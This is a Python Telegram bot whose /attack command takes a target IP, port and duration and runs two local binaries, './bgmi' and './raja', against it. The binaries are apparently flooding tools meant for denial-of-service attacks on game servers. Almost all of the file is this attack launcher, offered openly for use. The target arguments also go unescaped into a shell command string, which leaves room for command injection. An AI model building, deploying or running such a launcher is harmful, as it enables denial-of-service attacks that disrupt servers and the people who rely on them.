import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# --- BOT CONFIGURATION ---
TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
ALLOWED_USER_ID = 1885926472  # Replace with actual user ID

# --- START COMMAND ---
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# --- ATTACK FUNCTION ---
async def run_attack(chat_id, target, port, duration, context):
    try:
        # First process
        process1 = await asyncio.create_subprocess_shell(
            f"./bgmi {target} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout1, stderr1 = await process1.communicate()

        # Output of first process
        if stdout1:
            print(f"[stdout1]\n{stdout1.decode()}")
        if stderr1:
            print(f"[stderr1]\n{stderr1.decode()}")

        # Second process
        process2 = await asyncio.create_subprocess_shell(
            f"./raja {target} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout2, stderr2 = await process2.communicate()

        # Output of second process
        if stdout2:
            print(f"[stdout2]\n{stdout2.decode()}")
        if stderr2:
            print(f"[stderr2]\n{stderr2.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*", parse_mode='Markdown')

# --- TELEGRAM ATTACK COMMAND ---
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  

    # Access Check
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Access Denied!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battle begin! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

# --- MAIN FUNCTION ---
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
    